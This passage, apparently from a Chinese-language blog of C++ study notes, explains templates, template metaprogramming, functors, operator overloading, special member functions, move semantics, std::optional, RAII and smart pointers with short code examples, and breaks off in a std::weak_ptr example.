<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个参数是不同容器对应的迭代器</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> It, <span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">It <span class="title">find</span><span class="params">(It begin, It end, <span class="type">const</span> T&amp; value)</span> </span>{</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = begin; it != end; ++it) {</span><br><span class="line">    <span class="keyword">if</span> (*it == value) <span class="keyword">return</span> it;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> end;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一种写法，直接将容器作为参数</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Container, <span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">find</span><span class="params">(<span class="type">const</span> Container&amp; c, <span class="type">const</span> T&amp; value)</span> </span>{</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">auto</span> it = c.<span class="built_in">begin</span>(); it != c.<span class="built_in">end</span>(); ++it) {</span><br><span class="line">  <span class="keyword">if</span> (*it == value) <span class="keyword">return</span> it;</span><br><span class="line"> }</span><br><span class="line"> <span class="keyword">return</span> end;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="模板元编程template-metaprogramming">模板元编程（Template
Metaprogramming）</h2>
<p>TMP，它允许程序在编译阶段进行复杂的计算和类型推导，而不需要在运行时进行处理</p>
<ol type="1">
<li><p>示例：通过模板递归计算阶乘，可以在<strong>编译期</strong>执行计算</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归模板计算阶乘</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Factorial</span> {</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = N * Factorial&lt;N - <span class="number">1</span>&gt;::value;  <span class="comment">// 递归调用</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本情况：当 N 为 0 时，阶乘为 1</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Factorial</span>&lt;<span class="number">0</span>&gt; {</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> value = <span class="number">1</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    std::cout &lt;&lt; Factorial&lt;<span class="number">5</span>&gt;::value &lt;&lt; std::endl;  <span class="comment">// 输出: 120</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>在模板中使用 <strong>predicates</strong>（谓词）</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> It, <span class="keyword">typename</span> Pred&gt;</span><br><span class="line"><span class="function">It <span class="title">find</span><span class="params">(It first, It last, Pred pred)</span> </span>{ <span class="comment">// 这里的pred其实是一个返回布尔值的函数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = first; it != last; ++it) {</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pred</span>(*it)) <span class="keyword">return</span> it;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> last;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="lambda">Lambda</h2>
<p>详见
https://hxt616.github.io/2024/12/02/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</p>
<h2 id="functor">Functor</h2>
<p><strong>functor</strong>（仿函数）是一个行为类似函数的对象，具体来说是
<strong>重载了函数调用运算符 <code>()</code>
的类或结构体的实例</strong>。通过这种方式，类或结构体的对象可以像普通函数一样被调用。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例一</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Functor</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> x)</span> <span class="type">const</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Called with "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例二</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">std</span>::greater {</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> T&amp; a, <span class="type">const</span> T&amp; b)</span> <span class="type">const</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line">std::greater&lt;<span class="type">int</span>&gt; g;</span><br><span class="line"><span class="built_in">g</span>(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">// 返回值是false</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>当使用lambda表达式时，会生成对应的functor</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lambda = [](<span class="type">int</span> x) { <span class="keyword">return</span> x * x; };</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译器会生成类似以下的类：</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LambdaAnonymous</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> x)</span> <span class="type">const</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> x * x;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<h2 id="algorithm-库"><code>&lt;algorithm&gt;</code> 库</h2>
<p>该库是模板函数的集合</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250123004800250.png" alt="image-20250123004800250">
<figcaption aria-hidden="true">image-20250123004800250</figcaption>
</figure>
<h2 id="操作符重载">操作符重载</h2>
<p>Operator Overloading，自定义操作符的行为</p>
<ul>
<li><p>不能被重载的运算符：<code>::   ?   .   .*   sizeof()   typeid()   cast()</code></p></li>
<li><p>两种重载方式：</p>
<ol type="1">
<li><p>成员重载：在类内对操作符进行重载，调用时通过<code>b.operator&lt;(rhs)</code>（b是对象）</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> Obj::<span class="keyword">operator</span>&lt; (<span class="type">const</span> Obj&amp; rhs) <span class="type">const</span> {...}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>非成员重载：在类外进行重载，同时将两个操作对象作为参数</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Obj&amp; lhs, <span class="type">const</span> Obj&amp; rhs);</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>非成员重载可以通过<strong>友元</strong>实现，这样就能访问私有变量</p>
</blockquote></li>
</ol></li>
</ul>
<h2 id="特殊成员函数">特殊成员函数</h2>
<p>Special Member Functions
(SMFs)，特殊成员函数是类（或结构）成员函数，在某些情况下，编译器会自动为你生成。
包括<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/cpp/constructors-cpp?view=msvc-170#default_constructors">默认构造函数</a>、<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/cpp/destructors-cpp?view=msvc-170">析构函数</a>、<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/cpp/copy-constructors-and-copy-assignment-operators-cpp?view=msvc-170">复制构造函数和复制赋值运算符</a>，以及<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/cpp/move-constructors-and-move-assignment-operators-cpp?view=msvc-170">移动构造函数和移动赋值运算符</a>。</p>
<ul>
<li><p>Default constructor: T()</p></li>
<li><p>Destructor: ~T()</p></li>
<li><p>Copy constructor: T(const T&amp;)</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Widget widgetOne;</span><br><span class="line">Widget widgetTwo = widgetOne;</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><strong>对于拷贝构造函数，如果类包含动态数组（即指针指向的堆内存），必须单独为数组分配新内存，并拷贝内容（深拷贝），而不是仅仅赋值指针，否则会引发
浅拷贝（shallow copy） 问题</strong></p>
</blockquote></li>
<li><p>Copy assignment operator: T&amp; operator=(const T&amp;)
（操作对象是<strong>已经存在的对象</strong>，注意与上面函数区别）</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Widget widgetOne;</span><br><span class="line">Widget widgetTwo;</span><br><span class="line">widgetOne = widgetTwo</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Move constructor: T(T&amp;&amp;)</p>
<p>移动构造函数的作用是通过<strong>转移资源</strong>来构造一个新对象，而不是深拷贝资源，这样就可以提高空间利用率</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移动构造函数</span></span><br><span class="line"><span class="built_in">MyClass</span>(MyClass&amp;&amp; other) <span class="keyword">noexcept</span> : <span class="built_in">data</span>(other.data) {</span><br><span class="line">    other.data = <span class="literal">nullptr</span>; <span class="comment">// 将源对象的资源置为 nullptr</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Move Constructor called"</span> &lt;&lt; std::endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>Move assignment operator: T&amp; operator=(T&amp;&amp;)</p>
<p>移动赋值运算符的作用是将一个对象的资源转移到另一个<strong>已经存在</strong>的对象中。它在执行资源转移的同时，释放目标对象的已有资源以防止内存泄漏。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移动赋值运算符</span></span><br><span class="line">MyClass&amp; <span class="keyword">operator</span>=(MyClass&amp;&amp; other) <span class="keyword">noexcept</span> {</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> != &amp;other) { <span class="comment">// 防止自赋值</span></span><br><span class="line">        <span class="keyword">delete</span> data;      <span class="comment">// 释放已有资源</span></span><br><span class="line">        data = other.data; <span class="comment">// 转移资源</span></span><br><span class="line">        other.data = <span class="literal">nullptr</span>; <span class="comment">// 将源对象的资源置为 nullptr</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Move Assignment Operator called"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function">MyClass <span class="title">obj1</span><span class="params">(<span class="number">42</span>)</span></span>;    <span class="comment">// 调用构造函数</span></span><br><span class="line"><span class="function">MyClass <span class="title">obj2</span><span class="params">(<span class="number">100</span>)</span></span>;   <span class="comment">// 调用构造函数</span></span><br><span class="line">obj2 = std::<span class="built_in">move</span>(obj1); <span class="comment">// 触发 移动赋值运算符</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="move-semantics移动语义">Move Semantics（移动语义）</h2>
<p>涉及到了左值右值，下面没有详细展开，主要介绍<code>std::move</code>函数。</p>
<p>移动构造函数、移动赋值运算符均属于该知识点，当要触发这两个函数时，需要用到<code>std::move</code>，例如上面的例子</p>
<h3 id="stdmove">std::move</h3>
<h4 id="定义">定义</h4>
<ul>
<li><code>std::move</code>
是一个标准库函数，用于将左值显式地转为右值引用，从而触发移动语义。</li>
<li>注意：<code>std::move</code>
并不移动对象，而是允许对象的资源被移动。</li>
</ul>
<h4 id="语法">语法</h4>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">T&amp;&amp; <span class="title">std::move</span><span class="params">(T&amp; t)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<h4 id="示例-2">示例</h4>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::string str = <span class="string">"Hello"</span>;</span><br><span class="line">std::string movedStr = std::<span class="built_in">move</span>(str); <span class="comment">// 触发移动构造函数</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="stdoptional">std::optional</h2>
<p><code>std::optional</code> 是 C++17
引入的一个工具类，用来表示一个值可能存在也可能不存在的情形。它提供了一种优雅的方式来处理可能为空的值，而不需要依赖额外的布尔标志或使用指针。</p>
<h3 id="主要特点"><strong>主要特点</strong></h3>
<ol type="1">
<li><strong>值的可选性：</strong>
<ul>
<li>一个 <code>std::optional</code>
对象可以包含一个值，也可以不包含值（即处于 "empty" 状态）。</li>
<li>适合用来表示“可有可无”的数据。</li>
</ul></li>
<li><strong>避免空指针：</strong>
<ul>
<li>比如函数可能返回一个值，也可能不返回值，用
<code>std::optional</code> 替代返回指针避免空指针引发的错误。</li>
</ul></li>
<li><strong>强类型保障：</strong>
<ul>
<li>提供比返回 <code>nullptr</code> 或特殊标志（例如 <code>-1</code> 或
<code>0</code>）更安全的方式，确保程序的行为更加明确。</li>
</ul></li>
</ol>
<h3 id="使用场景-2"><strong>使用场景</strong></h3>
<ol type="1">
<li><p><strong>函数返回值</strong> 当函数不总是能返回有效值时，用
<code>std::optional</code> 表示返回值的可选性。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;optional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">std::optional&lt;std::string&gt; <span class="title">findNameById</span><span class="params">(<span class="type">int</span> id)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">1</span>) <span class="keyword">return</span> <span class="string">"Alice"</span>;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="number">2</span>) <span class="keyword">return</span> <span class="string">"Bob"</span>;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="literal">nullopt</span>; <span class="comment">// 无值的情况</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> name = <span class="built_in">findNameById</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (name) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Found: "</span> &lt;&lt; *name &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Name not found.\n"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>替代布尔标志：</strong>
用于标志是否存在值，避免额外的布尔变量。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Result</span> {</span><br><span class="line">    std::optional&lt;<span class="type">int</span>&gt; data;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function">Result <span class="title">compute</span><span class="params">(<span class="type">bool</span> flag)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (flag) <span class="keyword">return</span> Result{<span class="number">42</span>};</span><br><span class="line">    <span class="keyword">return</span> Result{std::<span class="literal">nullopt</span>};</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>临时对象的状态管理：</strong>
表示某些临时值是否有效，比如缓存结果。</p></li>
</ol>
<blockquote>
<p>注意<code>nullptr</code>和<code>std::nullopt</code>区别</p>
<ul>
<li><code>nullptr</code>：专门用来表示指针不指向任何对象。它可以隐式地转换为任意指针类型，例如
<code>int*</code>, <code>char*</code>, <code>void*</code> 等。</li>
<li><code>std::nullopt</code>：它是 C++17 中引入的
<code>std::optional</code> 的特殊值，用来表示一个
<code>std::optional</code>
对象不包含任何值（为空的状态）。它可以隐式地用于任何
<code>std::optional&lt;T&gt;</code> 类型，用于初始化或重置
<code>optional</code>。</li>
</ul>
</blockquote>
<h2 id="raii">RAII</h2>
<p>RAII，全称为 <strong>资源获取即初始化</strong>（Resource Acquisition
Is Initialization），是一种 C++ 的重要设计理念。RAII
的核心是将资源（如内存、文件、网络连接、锁等）的管理与对象的生命周期绑定。具体来说：</p>
<ul>
<li><strong>在对象构造时获取资源</strong>，确保资源在对象的整个生命周期内可用。</li>
<li><strong>在对象析构时释放资源</strong>，自动清理以防资源泄漏。</li>
</ul>
<p>这种方式可以有效地避免资源泄露问题，简化资源管理。<strong>常见应用场景</strong>：</p>
<ol type="1">
<li><p><strong>智能指针：</strong></p>
<ul>
<li><code>std::unique_ptr</code>, <code>std::shared_ptr</code>
等智能指针利用 RAII 管理动态内存。</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">example</span><span class="params">()</span> </span>{</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt; ptr = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">42</span>); <span class="comment">// 构造时分配内存</span></span><br><span class="line">    <span class="comment">// 无需手动释放内存</span></span><br><span class="line">} <span class="comment">// 离开作用域时，ptr 自动释放内存</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>文件管理：</strong></p>
<ul>
<li>使用 RAII 类管理文件资源，避免文件未关闭的问题。</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="function">std::ofstream <span class="title">file</span><span class="params">(<span class="string">"example.txt"</span>)</span></span>; <span class="comment">// 打开文件</span></span><br><span class="line">    <span class="keyword">if</span> (!file) <span class="keyword">return</span>;</span><br><span class="line">    file &lt;&lt; <span class="string">"Hello, RAII!"</span>;</span><br><span class="line">} <span class="comment">// 离开作用域时，file 自动关闭</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p><strong>锁管理：</strong></p>
<ul>
<li>使用 RAII 类如 <code>std::lock_guard</code>
管理线程同步中的锁。</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">criticalSection</span><span class="params">()</span> </span>{</span><br><span class="line">    std::mutex mtx;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>; <span class="comment">// 自动加锁</span></span><br><span class="line">    <span class="comment">// 临界区代码</span></span><br><span class="line">} <span class="comment">// 离开作用域时，lock_guard 自动解锁</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="智能指针">智能指针</h2>
<p>Smart Pointers</p>
<h3 id="stdunique_ptr">1.
<strong><code>std::unique_ptr</code></strong></h3>
<ul>
<li><strong>特点</strong>: 独占所有权。一个对象只能由一个
<code>std::unique_ptr</code> 所管理。</li>
<li><strong>主要用途</strong>:
用于明确对象所有权的场景，比如局部变量的资源管理。</li>
<li><strong>自动释放</strong>: 离开作用域时自动释放所管理的对象。</li>
</ul>
<p><strong>用法</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uniquePtrExample</span><span class="params">()</span> </span>{</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt; ptr = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">10</span>); <span class="comment">// 推荐使用 std::make_unique</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能复制，以下代码会报错</span></span><br><span class="line">    <span class="comment">// std::unique_ptr&lt;int&gt; ptr2 = ptr;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以转移所有权</span></span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt; ptr2 = std::<span class="built_in">move</span>(ptr);</span><br><span class="line">    <span class="keyword">if</span> (!ptr) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"ptr is now empty after move."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><strong>优点</strong></p>
<ul>
<li>更轻量化，效率最高。</li>
<li>避免重复释放同一个对象的问题。</li>
<li>使用场景清晰，适合独占资源。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>不能共享所有权（即多个指针管理同一个资源）。</li>
</ul>
<h3 id="stdshared_ptr">2.
<strong><code>std::shared_ptr</code></strong></h3>
<ul>
<li><strong>特点</strong>: 共享所有权。多个 <code>std::shared_ptr</code>
可以共同管理同一个对象，直到最后一个 <code>std::shared_ptr</code>
被销毁时对象才会释放。</li>
<li><strong>主要用途</strong>:
用于需要多个指针共享资源的场景，比如资源共享和并发场景。</li>
</ul>
<p><strong>用法</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sharedPtrExample</span><span class="params">()</span> </span>{</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; ptr1 = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">20</span>); <span class="comment">// 推荐使用 std::make_shared</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Value: "</span> &lt;&lt; *ptr1 &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; ptr2 = ptr1; <span class="comment">// 共享所有权</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Use count: "</span> &lt;&lt; ptr1.<span class="built_in">use_count</span>() &lt;&lt; std::endl; <span class="comment">// 引用计数</span></span><br><span class="line"></span><br><span class="line">    ptr1.<span class="built_in">reset</span>(); <span class="comment">// ptr1 不再管理资源</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Use count after reset: "</span> &lt;&lt; ptr2.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><strong>优点</strong></p>
<ul>
<li>方便在需要共享资源的场景中使用。</li>
<li>自动进行引用计数，最后一个指针销毁时释放资源。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>有一定的性能开销（引用计数管理）。</li>
<li>如果存在循环引用，可能导致内存泄漏（需配合
<code>std::weak_ptr</code> 解决）。</li>
</ul>
<h3 id="stdweak_ptr">3. <strong><code>std::weak_ptr</code></strong></h3>
<ul>
<li><strong>特点</strong>: 弱引用。用于解决 <code>std::shared_ptr</code>
循环引用的问题。</li>
<li><strong>主要用途</strong>: 辅助 <code>std::shared_ptr</code>
使用，不增加引用计数，只能观察（弱引用）资源。</li>
</ul>
<p><strong>用法</strong></p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">weakPtrExample</span><span class="params">()</span> </span>{</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; shared = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">30</span>);</span><br><span 